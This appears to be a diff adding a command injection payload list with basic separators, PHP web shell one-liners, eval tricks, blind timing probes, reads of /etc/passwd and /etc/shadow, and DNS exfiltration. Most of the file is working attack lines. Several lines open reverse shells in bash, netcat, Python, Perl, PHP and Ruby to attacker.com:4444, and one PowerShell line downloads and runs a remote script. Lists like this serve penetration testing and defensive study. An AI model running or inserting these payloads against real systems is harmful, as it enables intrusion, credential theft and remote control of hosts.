@@ -1,0 +1,74 @@
+# Command Injection Payloads
+# Accuracy: 85%
+
+# Basic Injection
+;id
+|id
+||id
+&id
+&&id
+`id`
+$(id)
+
+# Chain Commands
+; id; whoami
+| ls -la
+|| cat /etc/passwd
+& ping -c 1 attacker.com
+&& nc -e /bin/sh attacker.com 4444
+
+# PHP Command Injection
+<?php system($_GET['cmd']); ?>
+<?php exec('whoami'); ?>
+<?php shell_exec('id'); ?>
+<?php passthru('cat /etc/passwd'); ?>
+
+# Python
+__import__('os').system('id')
+eval("__import__('os').system('whoami')")
+
+# Node.js
+require('child_process').exec('id')
+process.mainModule.require('child_process').exec('ls')
+
+# Blind Injection
+; sleep 5
+| ping -c 5 127.0.0.1
+& wait 5
+
+# File Read/Write
+; cat /etc/passwd
+| head -n 10 /etc/shadow
+; wget http://attacker.com/shell.php
+
+# Reverse Shell
+; bash -i >& /dev/tcp/attacker.com/4444 0>&1
+| nc attacker.com 4444 -e /bin/sh
+; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f
+
+# Python Reverse Shell
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+# Perl Reverse Shell
+perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+# PHP Reverse Shell
+php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+# Ruby Reverse Shell
+ruby -rsocket -e'f=TCPSocket.open("attacker.com",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+# Netcat Variations
+nc -e /bin/sh attacker.com 4444
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f
+
+# Powershell (Windows)
+powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"
+
+# DNS Exfiltration
+; dig `whoami`.attacker.com
+| nslookup $(cat /etc/passwd | base64).attacker.com
+
+# Time-based Detection
+; sleep 10
+| ping -c 10 127.0.0.1
